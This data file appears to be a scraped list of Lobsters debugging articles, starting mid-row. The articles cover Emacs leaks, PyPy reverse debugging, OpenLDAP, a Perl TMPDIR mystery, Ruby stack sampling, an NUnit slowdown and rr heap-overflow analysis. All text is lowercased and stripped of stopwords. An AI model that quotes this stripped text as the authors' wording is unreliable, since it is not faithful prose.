fetchoffvec vec n word fetchnfetch n le n fetchnflush nflush ioctl fd moniocxmfetch fetch process error nflush fetchnfetch many packet flush done nflush hdr struct ubsmonpacket mmaparea vec hdr type filler packet continue caddrt data mmaparea vec processpacket hdr data thus main idea execute one ioctl per n event although buffer circular returned header data cross end buffer pseudocode need gathering
560,Lobsters,debugging,Debugging,Debugging GNU Emacs memory leaks (part 1),http://notes.secretsauce.net/notes/2015/09/19_debugging-gnu-emacs-memory-leaks-part-1.html,debugging gnu emacs memory leak part,http,many month later finally figured make leak command result described mailing list http apparently starting daemon repeatedly creatingdestroying client frame made memory use consistently climb following zsh snippet tickle bug emacs daemon true seq timeout emacsclient c done sleep done memory use could monitored bit zsh true p h p pidof emacs r sleep done leak visible emacs q nt load user configuration emacs load full configuration leak much pronounced configuration loaded bisected configuration find bit causing leak found winnermode apparently winnermode keep list active frame nt clean dead frame list longrunning daemon workflow frame created destroyed time list end keeping reference data structure longer active turn prevents gc cleaning associated memory simple patch winnermode fix clearly see result fixed memory leak obvious memory leak feeling clearly leak since memory consumption growing even configuration loaded still way
561,Lobsters,debugging,Debugging,Become a GDB Power User,https://www.youtube.com/watch?v=713ay4bZUrw,become gdb power user,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature become gdb power user greg law accu youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature become gdb power user greg law accu youtube
562,Lobsters,debugging,Debugging,Give me 15 minutes & I'll change your view of GDB,http://undo-software.com/resources/presentations/cppcon-2015-greg-law-give-me-15-minutes-ill-change/,give minute change view gdb,one account google sign google account,one account google sign google account
563,Lobsters,debugging,Debugging,Accidental art produced by buggy code,https://twitter.com/accidental__art,accidental art produced buggy code,,detected javascript disabled browser would like proceed legacy twitter yes
565,Lobsters,debugging,Debugging,PyPy Status Blog: Reverse debugging for Python,https://morepypy.blogspot.com/2016/07/reverse-debugging-for-python.html,pypy status blog reverse debugging python,revpdb undodbgdb rr real use case get revpdb pypy source demo update current issue revpdb done stackless transformation reverse debugger python reverse debugging rr future work duhton,revpdb reverse debugger debugger go forward backward time uncommon feature least open source world idea used undodbgdb rr reverse debugger c code say saved many many day poking around blindly gdb pypy team pleased give revpdb reversedebugger similar rr python example worth thousand word let say big python program bug show inconsistently nailed something like start xpy stuff maybe involving processing file answering web request simulate another terminal etc sometimes minute program state becomes inconsistent get failing assert another exception case revpdb useful revpdb available linux osx right hard port os much alphalevel debugger full bug sorry believe still useful helped one real use case already get revpdb following demo done alpha version linux compiled arch linux wo nt provide binary easy enough retranslate much faster regular pypy contains neither jit custom gc grab pypy source mercurial hg update reversedebugger hg update exactly demo cd pypygoal rpythonbinrpython revdb targetpypystandalonepy withoutmodcpyext withoutmodmicronumpy possibly rename final pypyc pypyrevdb avoid confusion platform linux osx need fix work demo demo going use xpy big program import o class foo object value foo range value x xvalue x xvalue print oops osexit course clear occurs small example check fails item demo check written osexit exit immediately program written assert failure would execute thing traceback module afterwards print traceback would minor mess find exact point failing assert issue supposed fixed future alphalevel anyway regular assert regular postmortem pdb could observe xvalue indeed instead assert fails imagine program much bigger would find exact chain event caused value show particular foo object revpdb first need disable address space layout randomization aslr otherwise replaying work done following command line change state next reboot echo sudo tee procsyskernelrandomizevaspace update longer necessary revision run xpy revpdb version pypy instead regular interpreter cpython pypy pypyrdblogrdb pypyrevdb xpy pypyrevdb executable like slow pypy executable running without jit produce file logrdb contains complete log execution bug tracking occurs rarely need rerun several time get failure got failure done step start rpythontranslatorrevdbrevdbpy logrdb get pdbstyle debugger revdbpy normal python program run unmodified python internally look inside log path pypyrevdb run needed one forking subprocess special mode initially start program end like get regular debugger file builtin appmainpy line setupbootstrappath list command available help go end continue c continue file tmpxpy line module foo range value x xvalue x xvalue print oops osexit beginning last executed line number time measured number line executed go backward bstep command backward step b line line forward step command also command bnext bcontinue bfinish forward equivalent also go time jump directly specified time right debugger stop line start event function entry exit make case bit surprising example step return statement function foo jump directly caller caller caller current line return foo line start event occurs caller foo return print python expression statement using p command p x mainfoo object p xvalue p xvalue num prefix shown print object really exists debugged program last line contain num printed use expression even different point time becomes anchor always refers object bstep file tmpxpy line module foo range value x xvalue x xvalue print oops osexit p case want know value put attribute job watchpoint watch watchpoint added updating watchpoint value watchpoint mean evaluated line repr expression change watchpoint activates execution stop bcontinue searching searching updating watchpoint value reversehit watchpoint file tmpxpy line module import o class foo object value foo range value x xvalue x xvalue print oops osexit note using num syntax essential watchpoints ca nt say watch xvalue variable x go scope soon move forward backward time fact watchpoint expression always evaluated inside environment contains builtins current local globals also contains num used refer known object thus common watch object watch len list watch expression also simple boolean example watch dict object find dict would use find time put inside removed use info watchpoints delete watchpointnum manage watchpoints also regular breakpoints set b funcname break whenever call function happens given name might annoying use function like init many homonym support breaking fullyqualified name given line number demo stop line xvalue value changed use bcontinue stop line value value changed know value attribute end bcontinue searching searching updating watchpoint value reversehit watchpoint file tmpxpy line module import o class foo object value foo range value x xvalue x xvalue try use bcontinue yet another time stop created point time refers object exist yet watchpoint evaluates error message continues work error message string currently evaluates bcontinue searching updating watchpoint value runtimeerror refers object created later time reversehit watchpoint file tmpxpy line module import o class foo object value foo range value x xvalue x big program workflow similar complex usually work way find interesting point time combination watchpoints direct command move around write piece real virtual paper point history including importantly time construct ordered understanding going current revdb annoying sometimes even crash history reconstruct kept time expression printed still valid restart revdb thing lost num object need print maybe instead use big number big number identifies uniquely object creation time number would continue valid even revdb restarted annoying use though screencast slightly typoy screencast cfbolz using reverse debugger current issue general issue using revdb log took minute record painfully slow revdb need replay big part log operation pypyrevdb currently missing following module thread implementing multithreading possible done yet cpyext cpython c api compatibility layer micronumpy minor issue continuation greenlets contain jit use fast garbage collector expect pypyrevdb maybe time slower cpython work linux osx fundamental reason restriction work fix replaying program us lot memory maybe much recording creates many fork program consumes ram need reduce maxsubprocesses processpy replaying also come bunch user interface issue attempted io access raw memory get whenever trying print expression evaluated gc memory repr method result need reset state bstep step print anything else however repr crash still see num prefix use num afterwards id globally unique returning reproducible number sometimes using id x workaround using x nt work attempted io issue eg p id x x somelist explained demo nextbnextfinishbfinish might jump around bit nonpredictably similarly break watchpoints stop apparently unexpected place going backward try step issue stop beginning every line extreme example line foo somelistpop getindex somelist modified middle immediately modification occurs getindex immediately afterwards foo watchpoint stop program end getindex running backward start foo running forward never actually line change watchpoint expression must sideeffect replaying get sync revdbpy complain regular p expression statement sideeffects effect discarded soon move time sometimes even p import foo fail attempted io use instead p import sys foo sysmodules foo use help see command backtrace useful command move time instead eg using bfinish go back point current function called revpdb done pick main advantage pypy cpython got rpython translation toolchain real place experimentation every build inside rpython feature give u optionally tweaked version pypy interpreter tweaked way would hard cpython would require systematic change everywhere obvious successful example gc jit many experiment along line socalled stackless transformation early day stm version pypy revpdb work similar way version pypy operation systematically replaced operation keep log file reasonable size duplicate content gc object replaying repeating action without writing anything log file mean pypyrevdb binary operation arithmetic readwrite gcmanaged memory modified operation like however operation one involve either nongc memory call external c function tweaked operation replaced code work two mode based global flag recording mode log result operation argument replaying mode nt really operation instead fetch result log hopefully remaining unmodified operation arithmetic gc loadstore completely deterministic replaying every integer nongc pointer variable exactly value recording interestingly mean recording process big array nongc memory replaying process array allocated represented address nothing record read item array record result read replay seeing read item array operation point nt read anything return result log similarly recording write array record nothing write operation result replaying redo nothing note differs anything managed gc memory gc object including gc array really allocated writes really occur read redone nt touch log case reverse debugger python already python experiment reverse debugging also known omniscient debugging however claim result get useful purpose presented work typically recording change object like list dictionary addition recording history program passed however problem python list dictionary end story many many many type object written c mutable fact immutable one exception try systematically record change huge task easy forget detail word typical use case tweaking rpython translation toolchain rather tweaking cpython pypy interpreter directly result get revpdb similar rr anyway relatively small number external event recorded every single change every single list dictionary link c future work mentioned alphalevel work linux osx plan immediate future fix various issue described port operating system core system c file header rpythontranslatorrevdbsrcrevdb interested people also duhton interpreter reversedebugger branch prototyped rpython concept moving pypy basic work interpreter written rpython require specific code interface language case pypy pypyinterpreterreversedebuggingpy parallel various user interface improvement people could interested like pdb experience script rpythontranslatorrevdbrevdbpy moved official place reversedebugger branch merged back default would certainly welcome help armin
566,Lobsters,debugging,Debugging,Pro Linux systems spelunking,http://pythonsweetness.tumblr.com/post/146910732262/pro-linux-systems-spelunking,pro linux system spelunking,openldap mailing list post project chief architect slapdconf man page,really quick post document blindingly simple technique far many people unaware possibly even unjustifiably afraid want demonstrate sleepy braincells handful standard tool running debian ubuntu linux answer pretty much question running system without resorting stack overflow similarthe process taken minute due writing probably take closer half hour practice make um le imperfect chosen weapon aptgetcscopesilver searcher ag grepmkdir passing understanding c note expertise optional test casetonight arrived home still pondering write workaround morning due openldap slapd hanging client connection sent inflight search request without starting read responsesarmed syslog message deferring operation pending operation mailing list post project chief architect guide content workaround implemented fairly robust simply limit number inflight request would sleep much better night knowing exactly workaround erm work first place magic number simply coincidental trick default network buffer size know nothing work worry text mailing list post suggests openldap may hanging u based size record queued returned u set edge since future code might send unknown query pattern break simple heuristic limiting count record queued return end user worse bos might served http application paid build really like thatso without ado let jump straight inpraise debiandebian packaging tool pain as time one lesser loved feature need built right run pretty much debianubuntu box regular user without configuration feature aptget source onestep command fetching source code pretty much component ever likely come contact withif ever see old bearded unix nerd corner windowsonly team beavering away putty session linux vm running machine probably one reason whyso let go ahead grab source relevant openldap daemon producing syslog entryuse source lukenow well time try search syslog string silver searcher gnu grep support w option meaning word boundary prevents partial match prof convenient time searching plain english large projectthe advantage silver searcher grep task slightly prettier output defaultboomnow know message come let pop file vim vim serversslapdconnectionc bit see function landed named connectioninput need read entire function enough guess name central point openldap processing alreadydecoded messagescrolling back closer original starting point line see really helpful clue code pretty beautiful actually really easy case follow could diverge point post say function short oneword variable name improve comprehension massively let bother holy war excerpt see complex logic stashing away string defer variable need care logic enough notice subsequent branch based whether defer valuescrolling gut block find money shot function returning error return code number pending operation exceeds maximum max maximum calculated dynamically based idea let find cscope robin armed couple weird sounding variable name contributing max variable like figure conn cdnbvlen mean slapconnmaxpending variable get valuebefore jumping cscope verify conn cdn sound lot like distinguished name associated connection ldap speak mean authenticated user guessing maximum number pending operation varies depending whether authenticated let save time assume guess accurate pretty sure code clear enough focus slapconnmaxpending variablecscope rks use arrow key select find global definition resulting ugh much juice exit vim q search slapconnmaxpendingdefaultmuch better suggests maximum number default pending operation way higher seeing hangups ops let keep digging see else change variablethis time instead find global definition use find c symbol slapconnmaxpending aha come config file modern openldap config schema ldap server old using config schema enough information figure going onlightbulbsa quick google slapdconf brings u slapdconf man page quick findinpage word pending lead u boom workaround indeed function desired since keep pending operation count know half maximum found oldstyle openldap configuration filebased knowing app received hangups pending ops know openldap config unlikely tweaking setting default discrepancy easily attributed network latencynext time next time might lucky turned case diligent reading doc would turned relevant setting depends entirely doc existing ability discover common occurrence doc exist buried source code comment far away sighthere traded unpredictable session headscratching googling answer might exist predictable couple minute spent terminal answering question power look even really understand c admittedly accidentally easier expected example pick regardless try practice method wherever possible answering question resorting google stack overflow see deep rabbit hole go
567,Lobsters,debugging,Debugging,"Don't tug on that, you never know what it might be attached to",http://blog.plover.com/tech/tmpdir.html,nt tug never know might attached,nt tug never know might attached emacsclient finding socket disagreement bad experience stripping environment wtf perl working around problem working around problem red herring summary conclusion frew schmidt written incident article category tech permanent link,nt tug never know might attached story interesting bug tracked yesterday causing bad effect far bug actually emacsclient emacs text editor come separate utility called emacsclient communicate main editor process tell open file editing main emacs running somewhere else run command emacsclient somefiles sends main emacs message want edit somefiles emacs get message pop new window editing file done editing somefiles tell emacs typing c something communicates back emacsclient editing done emacsclient exit important olden day emacs big bloated took long time start used joke abbreviation meg constantly eight meg even today still useful say shell script need run editor reason running nice shell script called also something like interpret commandline argument pattern find file matching pattern present menu file wait select file interest run emacsclient selected file essentially wrapper around menupick menupicking utility wrote seen use component several tool type also wizard shell get menu file related wizard select one actually want edit show emacs convenient using emacs find open use many time day rather week suddenly stopped working everything ran fine execution emacsclient would fail saying emacsclient ca nt find socket started server socket facility enables interprocess communication case emacs emacsclient message familiar usually mean forgotten tell emacs start listening emacsclient running mx serverstart emacs start nt sure first time happened went emacs ran mx serverstart emacs announced started server reran also thing happened emacsclient ca nt find socket started server finding socket first question ca nt emacsclient find socket resolve naturally two subquestions socket emacsclient looking second one easily answered ran strace emacsclient hi julia saw last interesting thing emacsclient emitting error message stat enoent file directory mean looking socket nt find question emacs actually put socket file little trickier run emacs strace felt sure output would voluminous would tedious grovel nt exactly remember figured think probably made educated guess something like emacsclient looking mnttmp seems unusual would expect socket tmp maybe tmp looked tmp srwx mjd mjd jun beginning mean file socket endpoint interprocess communication familiar sort tcp socket tcp address enables communication internet since ancient time unix also supported unixdomain socket enable communication two process machine instead tcp address socket addressed using path filesystem case server creates socket appears filesystem special type file confirmed correct file typing mx serverforcedelete emacs immediately caused disappear similarly mx serverstart made reappear disagreement question emacsclient looking socket mnttmp emacs putting tmp used rendezvous properly gone wrong recalled environment variable controlling temporary file put env grep mnt see anything relevant turned sure enough tmpdirmnttmp program want create tmporary file directory normally tmp tmpdir setting use directory instead explained emacsclient looking explanation emacs creating socket tmp seemed clear emacs failing honor tmpdir setting clear explanation hand began report bug emacs using mx reportemacsbug folk emacs irc channel freenode suggested bad experience last time tried emacs people mocked even trying get useful information irc time went pretty well emacs popped buffer full version information invited write step reproduce problem wrote export tmpdirmnttmp emacs ran command shell wrote emacs mx getenv tmpdir emacs claim variable emacs also instead claiming variable emacs cheerfully informed value tmpdir mnttmp important lesson submit bug report find minimal demonstration also try minimal demonstration exactly reported happened sent bug report would wasted everyone else time even worse would looked like fool minimal demonstration demonstrate something else going tmpdir headscratcher could think emacsclient emacs somehow getting different environment one tmpdir setting one without maybe run different shell one shell setting got sidetrack point find tmpdir set first place nt think set looked etcprofile default bash startup instruction nt also noticed etcprofiled seemed relevant saw later etcprofile contained instruction load everything etcprofiled grepped tmpdir profiled file found set etcprofiledziprecruiterenvironmentsh sysadmins installed mystery least cleared got second sidetrack looking git history recent change involving tmpdir nt dead end still puzzled emacs sometimes got tmpdir setting sometimes realized original emacs process one failed rendezvous emacsclient started usual way instead simply running emacs run git reedit invokes git run homemjdbingitreedit perl program wrote bunch stuff figure file editing recently exec emacs edit several program could tampering environment removing tmpdir setting accurately point finger blame put diagnostics gitreedit program print value tmpdir indeed gitreedit reported tmpdir unset clearly culprit git must removing tmpdir environment invoking perl program stripping environment confirm conclusion created tiny shell script homemjdbingitenv simply printed environment ran git env tell git find gitenv run environment printed omit tmpdir would know git culprit tmpdir output created perl version gitenv called gitperlenv thing ran via git perlenv time tmpdir output ran diff output git env git perlenv git perlenv missing tmpdir perl fault verified running perl homemjdbingitreedit directly without involving git diagnostics put reported tmpdir unset wtf perl point tried getting rid getreedit ran oneline program perl le print env tmpdir simply run perl tell print value tmpdir environment variable print mnttmp instead printed empty string smoking gun perl longer anywhere hide mystery cleared however perl surely bug someone else would noticed obvious bug sometime past year failed tmpdir variable example foobar perl le print env foo printed bar one would expect weird could perl environment handling broken tmpdir variable point got rik signes frew schmidt look confirmed problem perl generally perl perl system display behavior looked output perl v say version perl using patch applied wasted lot time looking seemed relevant turned red herring working around problem going looking workaround finding one least important actually tracking problem ultimately paid something figure perl losing tmpdir workaround hand mean get sick tired looking underlying problem abandon instantly instead push onward first workaround found use unixdomain socket emacs option use tcp socket instead useful system support unixdomain socket nonunix system told still exist set serverusetcp variable true value start server emacs creates tcp socket writes description usually emacsdserverserver run emacsclient tell connect socket described file emacsclient serverfileemacsdserverserver setting emacsserverfile environment variable tried worked figured thing serverusetcp misunderstood first thought meant unixdomain socket tried get emacsclient use right one setting emacsserverfile nt work resulting error message obscure enough lead irc ask working around problem spent quite looking environment variable analogous emacsserverfile tell emacsclient unixdomain socket socketname commandline argument control inexplicably environment variable hacked also command responsible running emacsclient look environment variable named emacsserversocket pas value emacsclient socketname one probably would better write wrapper emacsclient nt put emacsserversocket tmpdiremacs id u server bash profile effectively solved problem set emacsserversocket whenever started new shell ran also would notice setting pas along emacsclient socketname tell emacsclient look right place set could forget original problem wanted perl removing tmpdir environment nt figure answer frew took irc channel perlorg answer eventually tracked matthew horsfall zefrem answer turned quite subtle one classic attack mounted process elevated privilege follows suppose know program going write temporary file set tmpdir beforehand trick writing wrong place possibly overwriting destroying something important program loaded process dynamic loader loading protect attack loader check see program going run elevated privilege say setuid sanitizes environment prevent attack among thing remove tmpdir environment nt thought exactly thought something like perl detects running setuid enables secure mode among thing sanitizes environment example ignores environment variable normally tell look loadable module instead load module compiledin trustworthy directory checked early see causing tmpdir problem perl executable setuid perl running secure mode linux support feature called sort partial superuser privilege give program superuser capability without giving away key whole kingdom system configured give perl one extra capability binding lownumbered tcp port normally permitted superuser dynamic loader ran perl saw additional capability removed tmpdir environment safety emacs tmpdir setting run command line run via gitreedit came even aware feature existed red herring one delightful confusion way happy ending frew found perl development machine misbehaving tried logging nearly identical development machine see misbehaved way ran system update update perl problem went away told would fix problem machine reported updated system hour nothing update elevated capability theory explained also frew updated system new perl installed without elevated capability feature dynamic loader remove tmpdir environment updated system earlier thing happened soon update complete reloaded system configuration reinstated capability setting frew nt done summary system configuration gave perl special capability dynamic loader sanitized environment perl ran emacs emacs process nt tmpdir environment setting caused emacs create listening socket usual place emacsclient get setting looked wrong place conclusion computer stuff amazingly complicated nt know anyone get anything done addendum frew schmidt written incident cover different ground addendum hacker news comment asks changed cause problem perl losing tmpdir week week frew nt know article category tech permanent link
569,Lobsters,debugging,Debugging,I do not use a debugger,http://lemire.me/blog/2016/06/21/i-do-not-use-a-debugger/,use debugger,basic turbo pascal integrated development environment chris wellon wrote borland c rob pike similar conclusion reading wrote,learned program basic back twelve would write elaborate program run invariably would surprise failing expect would struggle time eventually give accept whatever bug created stay would take decade learn produce reliable useful software day still get angry people take granted software expect without fail case eventually graduated something better turbo pascal turbo pascal great programming language coupled fantastic programming environment comparable many way modern integrated development environment ides yet three decade old something impressive could use debugger mean could run program line line watching happened variable could set breakpoints program would halt give control recently chris wellon wrote borland c environment made couple test project built ran different option poked around debugger debugger actually pretty decent especially time thought programming debugger future decade later program various language c javascript go java c almost never use debugger use fancy tool certainly use tool called debugger like gdb almost never step program linebyline watching variable value almost never set breakpoints say almost case debugger right tool mostly simple quickanddirty project context brain overwhelmed fully master language code said recall last time used debugger debugger step code vague recollection debug dirty piece javascript alone five minute able find several famous programmer took position debugger reported barely using make clear think one objective truth regarding tool true tool shape u complex set interaction work work tool using forth whatever work might best however fact linus torvalds charge critical piece infrastructure made million line code linux kernel use debugger tell u something debugger anyhow stop using debugger debugger conceived era worked moderately small project simple processor thread outoforder execution simple compiler relatively small problem formal testing feel debugger scale much time life either write code something else like running linebyline code something else mean rethinking code easier maintain le buggy adding smarter test future bug readily identified effortlessly investing time manner make code better lasting whereas debugging code linebyline fix one tiny problem without improving process future diagnostics larger complex project get le useful debugger get debugger scale hundred processor terabyte data trillion closely related instruction rather take risk ultimate goal work difficult project problem arise always require almost effort pinpoint fix problem relying debugger first line defense bad investment always try improve code first rob pike one author go language came similar conclusion dive bug tend fix local issue code think bug first bug came often find correct higherlevel problem code improve design prevent bug want misunderstood however need use tool better program ever sophisticated software however running code linebyline checking value variable way scale complexity encourages wrong kind design let end quote sum sentiment debugger remove bug show slow motion reading ben deane experienced game developer worked goldeneye medal honor starcraft diable world warcraft forth wrote principal problem debugging scale order catch bug often need able run sufficiently large representative data set point debugger usually crude tool use using debugger scale type tool test
570,Lobsters,debugging,Debugging,How to spy on a Ruby program,http://jvns.ca/blog/2016/06/12/a-weird-system-call-process-vm-readv/,spy ruby program,rbtrace step gdb great gdb script adventure production rail debugging amazing script gdb good enough pris nasrat dwarf spying program without gdb without julian squire actually building thing work kind flame graph debugger exciting,love debugging tool one frustrating thing run ruby python program find program right might eagerly interrupt julia say use pdb pry rbtrace let explain running program jvm pid run jstack p print current stack trace java program java program need special configuration c run sudo perf top linux machine instantly give live profile c function running c program know one favorite thing amazing pstack something similar jstack binary ruby nothing yet preinstrument ruby program library use stuff built ecosystem way make grumpy like java nice thing ruby python let talk could build jstack ruby step gdb scott francis shopify great gdb script print ruby stacktrace attach gdb read script work adventure production rail debugging took couple day understand going script attach program gdb seems like basically black magic usual actually magic first let explore little gdb little messy want see explore program memory gdb think cool redacted longer output hello ruby address current thread process gdb p rubycurrentthread rbthreadt sweet let get current frame pointer going find stack trace gdb p rubycurrentthread cfp rbcontrolframet oh nt want address let see inside gdb p rubycurrentthread cfp pc sp iseq flag self klass ep blockiseq proc next step need look iseq property another pointer also dereference see inside gdb p rubycurrentthread cfp iseq rbiseqt gdb p rubycurrentthread cfp iseq type iseqtypetop location path absolutepath baselabel label firstlineno iseq iseqencoded iseqsize markary left bunch stuff phew kind long luckily care locationpath locationlabel let print gdb p struct rstring rubycurrentthread cfp iseqlocationlabel basic heap ary block gdb p struct rstring rubycurrentthread cfp iseqlocationpath basic flag klass heap len ptr amazing amazing started practically nothing address current thread finished file place file block initialize write kind weird thing get information struct rstring rubycurrentthread cfp iseqlocationlabel got script basically except little smarter also get line number cool gdb good enough pretty awesome attach almost ruby process get stack trace wanted well quite gdb us ptrace system call case stop program track intensely query internals slower want maybe ruby program needed actually keep running ran gdb command p struct rstring rubycurrentthread cfp iseqlocationpath ton stuff going paste strace output gdb actually megabyte system call small excerpt every time need read memory target program looking string issue bunch system call like ptrace ptracepeektext ptrace ptracepeektext ptrace ptracepeektext ptrace ptracepeektext ptrace ptracepeektext ptrace ptracepeektext ptrace ptracepeektext ptrace ptracepeektext ptrace ptracepeektext gdb work first read debugging info ruby binary tell size structure structs need access rbiseqt struct rstring rbcontrolframet know memory address mean anything let say run p rubycurrentthread cfp gdb gdb exactly look address rubycurrentthread symbol table let say look debug info figure type rbthreadt go get byte address using ptrace ptracepeektext system call look debug info figure offset cfp member rbthreadt struct done really cool learned gdb work pris nasrat helped figure gdb work dwarf move need talk dwarf remember said read debugging info ruby binary us format called dwarf going go read info right frankly know people say need compile debugging symbol mean debugging symbol dwarf spying program without gdb okay cool wanted get stack trace program without gdb thing could happen turn yes learning gdb work figured long debugging info ability read memory target program good go gdb happens use ptrace system call read memory ruby program necessary turn going make new friend processvmreadv julian squire person made think first place emailed like ugh julian make work like processvmreadv linux system call man page say system call transfer data address space calling process local process process identified pid remote process data move directly address space two process without passing kernel space want spy memory ruby program example writing debugger use processvmreadv neat reason awesome better gdb far tell impact processvmreadv running process way smaller spy memory get way actually building thing far talk actually work julia real sort wrote program rust sample stack trace rust cool way know manually manage memory c c literally c program instant memory leak rust deal compiler ended working program pretty quickly wrote prototype program see source work kind worked started spitting stack trace ruby program writing every millisecond pretty fast amazing used generate flame graph cool flame graph good news bad news actually learn use dwarf library yet hardcoded struct type result work anybody computer actual programming job far way progress instead feeling bad actually gotten software work yet people computer thought would take couple hour tell work maybe motivate actually fix make real software day later debugger exciting made even excited writing debugging tool question tool spit ruby stack trace quickly ruby program debugging symbol enabled actually exist somewhere know python maybe exist linuxonly ruby debugging tool sort weird thing build exist yet amazing debugging technology could build thanks julian squire pris nasrat kamal marhubi helping new system call gdb writing rust
572,Lobsters,debugging,Debugging,Tracking down a performance hit,https://codeblog.jonskeet.uk/2016/06/09/tracking-down-a-performance-hit/,tracking performance hit,noda time benchmarkdotnet step check really problem step find problematic test step find bottleneck step remove noda time step dig nunit step remove nunit github issue step file coreclr issue step file nunit issue issue step blog conclusion like,following progress net core lot interest trying make noda time master branch keep aim noda time eventually ship apology compatible net core start expected able support appears much missing look like actual target particularly looking forward able run noda time benchmark using benchmarkdotnet compare net core linux code window order make fair comparison two intel nucs sporting memory happens got far running benchmark net core able run unit test linux window using tfm recently pretty shocked see depending test ran test time slower linux window using case post brief log track problem step check really problem thought actually matter running test release configuration something similar verification ran test several time specifying c release command line use release build nodatimetestdll nodatimedll running debugger definitely issue done shell additionally ran test two way firstly running whole test suite secondly running wherecat slow avoid test got known really pretty slow typically test compare answer bcl give answer noda time give across whole history particular calendar system time zone pleased report bottleneck test almost always bcl help speed slow test much slower linux might pointed problem bcl calendar time zone code ratio vary enough problem circumstance worth looking step find problematic test strong expectation one way another whether would come general problem jit linux whether might one piece code causing problem test others knowing significant difference handling culture time zone code linux window implementation wanted find test used bcl little possible also slow enough difference timing pronounced easily explicable problem measuring small amount time fortunately nunit produce testresultxml file easy parse linq xml could easily transform result window linux list test ordered duration descending spot right kind test found answer umalqurayearmonthdaycalculatortestgetyearmonthdaydayssinceepoch effectively test um al qura calendar self consistency iterating every day supported time period checking convert day since unix epoch expected year month day particular test rely window implementation calendar use time zone culture anything similar nicely selfcontained test took linux window possible figure debug build repeated test using release build confirmed difference still similar step find bottleneck point aim try remove bit test time difference went away expected find something quite obscure causing difference something like different cpu cache behaviour knew next step would isolate problem small piece code expected would involve reasonable chunk noda time least type really lucky first obvious call remove made big difference equality assertion assertion usually first thing remove test everything else typically build something use making call without either using result later asserting something result presumably interested side effect soon removed call assertareequal expected actual execution time dropped massively linux hardly moved window effectively par wondered whether problem fact asserting equality custom structs tried replacing real assertion assertion equality string integer significant difference showed discrepancy window linux step remove noda time identified assertion cause problem trivial start new test project dependency noda time consisting test like test public void foo int var x var assertareequal x still demonstrated problem consistently allowed simpler experimentation different assertion step dig nunit life glad lot implementation detail framework exposed publicly able try lot different bit asserting equality order pin problem thing tried assertareequal x slow assertthat x isequalto slow constructing nunitequalitycomparer fast calling nunitequalitycomparerareequal fast construction occurred loop comparison loop calling isequalto slow last bullet two bullet surprising tipped nunitequalitycomparer us reflection could easily differ performance window checking equality seemed fast constructing constraint slow poking around nunit source code thank goodness open source obvious assertareequal x assertthat isequalto x behave way former call latter isequalto slow linux method simple creates instance equalconstraint equalconstraint constructor body proved equalconstraint causing problem deriving constraint noop implementation sure enough constructing slow leaf constructor constraint abstract base class protected constraint params object args argument args displayname thisgettype name displaynameendswith displaynameendswith displayname displaynamesubstring displaynamelength displaynameendswith constraint displayname displaynamesubstring displaynamelength look innocuous maybe calling gettype name expensive linux test nope fast point beginning wonder whether ever get bottom let test public void endswith string text abcdefg int iteration textendswith sure enough fast window slow linux wow look like culprit step remove nunit point relatively plain sailing reproduce issue simple console app list code github issue time calling endswith get jit compiled million time rigorous benchmark world absolutely difference linux window hardware worried inaccuracy millisecond step file coreclr issue shown filed bug github like think pretty good bug report detail environment short complete console app ready copypastecompilerun result exactly kind thing put stack overflow question ask minimal complete example stack overflow mean anyway minute later stephen toub basically worked nub culture issue initially reproduce saw result window linux changing culture engb saw seeing confirmed opposite ran code set langenus problem went away stephen pulled matt elli gave detail going wrong behind scene step file nunit issue matt elli suggested filing issue nunit reason code culturesensitive specifying string comparison ordinal go even faster path using u culture displaynameendswith constraint becomes displaynameendswith constraint stringcomparisonordinal equivalent two call pointed issue also little bit odd worked every constraint constructor call course going give result every instance type every constraint constructor call becomes every assertion entire test run pretty performancecritical piece code unit test important term performance way production code anything add friction bad news hopefully nunit team apply simple improvement next release coreclr team attack tougher underlying problem time step blog open stack edit start typing following progress conclusion none step listed particularly tricky diagnosing problem often matter determination unwilling admit defeat cleverness denying certain art able find right seam split problem two admittedly hope useful start finish example diagnostic session look feel like one physical session course found bit time investigate course day would step either way smug satisfied like like loading related
573,Lobsters,debugging,Debugging,Tracking Down Heap Overflows with rr,https://sean.heelan.io/2016/05/31/tracking-down-heap-overflows-with-rr/,tracking heap overflow rr,video execute reverse entirely unrelated training update advanced tool development smt solver contact vertexre like,anyone spent time vulnerability analysis cc experience floundering around debugger hour end trying figure source mysterious crash reason incredibly time consuming frustrating process simple memory corruption often quite subtle effect fact corruption occurred may actually become apparent far later program execution trace buggy function gone callstack along due randomisation various thing memory layout allocation pattern root cause manifest variety different way across multiple run example let say analysing interpreter eg php following occurs api call trigger function containing bug write buffer x overflow memory occupied object smashing pointer internal api call return interpreted program eventually end interpreter begin shutdown shutdown process notifies try use corrupted internal pointer crash time crash occurs trace buggy api call callstack apparent link source code content buffer x corrupted internal pointer object scenario limited buffer overflow heap useafterfrees memory lifetime management issue similar effect high level question want answer debugging situation straightforward data corrupted location get written taint tracking solution attempt solve problem tracking data forward taint source various reason existing implementation tend limited two fast accurate detailed three often required trace tainted data useful brings rr tool developed robert callahan mozilla project page video good introduction tool rr really fast record replay top also really fast reverse execution replay user interface provided gdb thus effectively get standard debugger interface guarantee repeated run identical well ability execute reverse key solving heap overflow problem execute reverse reverse execution watch point normal breakpoints still function word want know data memory came set watch point execute reversecontinue program execute reverse point data written hope following example highlight useful capability php interpreter recently potentially remotely exploitable issue due flaw libgd library bundle libgd issue assigned php bug tracker entry reporter rather helpfully included poc exploit find previous link intended spawn reverse shell poc useful starting point real exploit pretty much hit hope term reliability spray data overflowed buffer seemingly hope corrupting function pointer called corruption cause process die reason fun decided build reliable exploit around primitive offered bug first step figuring exactly existing poc failing first ran poc modphp died strlen function call due passed pointer unmapped region memory backtrace point normal gdb looked follows root localhost gdb gnu gdb gdb fedora addraddr entry addrlenaddrlen flagsflags return syscallcancel fd addrsockaddr addrlen flag gdb c continuing program received signal sigsegv segmentation fault strlen movdqu rax gdb bt strlen formatconverter freeing zu byte script sn strxprintv thu may script varwwwhtmluploadphpn freeing zu byte script sn apphpsnprintf thu may script varwwwhtmluploadphpn freeing zu byte script sn phpmessagehandlerforzend zendmessagedispatcher zendmmcheckleaks zendmmshutdown shutdownmemorymanager phprequestshutdown phpapacherequestdtor using normal gdb quickly figure issue strlen passed pointer unmapped memory source pointer phpmessagehandlerforzend function frame eg gdb f formatconverter freeing zu byte script sn slen strlen gdb l case case v vaarg ap char null slen strlen adjustprecision precision slen slen precision else gdb px gdb xx access memory address tell u argument strlen vararg figure came easily enough gdb f strxprintv thu may script varwwwhtmluploadphpn freeing zu byte script sn cc formatconverter od format ap gdb f 